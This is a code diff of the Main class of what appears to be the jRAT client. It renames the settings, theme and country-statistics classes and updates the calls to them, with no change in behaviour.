@@ -19,10 +19,10 @@ import se.jrat.client.addons.Plugin;
 import se.jrat.client.addons.PluginLoader;
 import se.jrat.client.commands.DefaultCommands;
 import se.jrat.client.net.WebRequest;
-import se.jrat.client.settings.AbstractSettings;
-import se.jrat.client.settings.CountryStatistics;
+import se.jrat.client.settings.AbstractStoreable;
+import se.jrat.client.settings.StatisticsCountry;
 import se.jrat.client.settings.Settings;
-import se.jrat.client.settings.Theme;
+import se.jrat.client.settings.SettingsTheme;
 import se.jrat.client.threads.RunnableCheckPlugins;
 import se.jrat.client.threads.RunnableNetworkCounter;
 import se.jrat.client.threads.ThreadCheckVersion;
@@ -104,8 +104,8 @@ public class Main {
 		Globals.mkdirs();
 
 		try {
-			Theme.getGlobal().load();
-			UIManager.setLookAndFeel(Theme.getGlobal().getTheme());
+			SettingsTheme.getGlobal().load();
+			UIManager.setLookAndFeel(SettingsTheme.getGlobal().getTheme());
 		} catch (Exception ex) {
 			Main.debug("Could not use look and feel, setting default");
 			ex.printStackTrace();
@@ -135,12 +135,12 @@ public class Main {
 			e.printStackTrace();
 		}
 
-		CountryStatistics.getGlobal().load();
+		StatisticsCountry.getGlobal().load();
 		Settings.getGlobal().load();
 		
 		instance = new Frame();
 		
-		AbstractSettings.loadAllGlobals();
+		AbstractStoreable.loadAllGlobals();
 
 		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
 		if (!showEULA) {
@@ -175,10 +175,10 @@ public class Main {
 					}
 				}
 
-				AbstractSettings.saveAllGlobals();
+				AbstractStoreable.saveAllGlobals();
 
 				try {
-					Theme.getGlobal().save();
+					SettingsTheme.getGlobal().save();
 				} catch (Exception e) {
 					e.printStackTrace();
 				}
